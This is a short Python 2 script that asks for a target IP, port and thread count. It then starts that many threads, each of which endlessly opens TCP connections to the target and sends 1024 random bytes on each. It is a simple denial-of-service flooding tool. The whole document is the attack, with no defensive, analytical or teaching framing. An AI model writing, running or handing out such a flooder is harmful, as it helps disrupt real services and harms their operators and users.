import threading
import socket
import random
import time

print (" ")
ip = raw_input("IP : ")
port = input("Port : ")
thread_num = input("Threads : ")
print (" ")
print "Please Wait While Packages Are Preparing Thread :",thread_num
time.sleep(5)

def run():
	bytes = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((str(ip),int(port))) 
			s.send(bytes)
			print "Package Sent !"
		except:
			s.close()
			print "Error , Socket Closed"
			
for i in range(thread_num):
    th = threading.Thread(target = run)
    th.start()
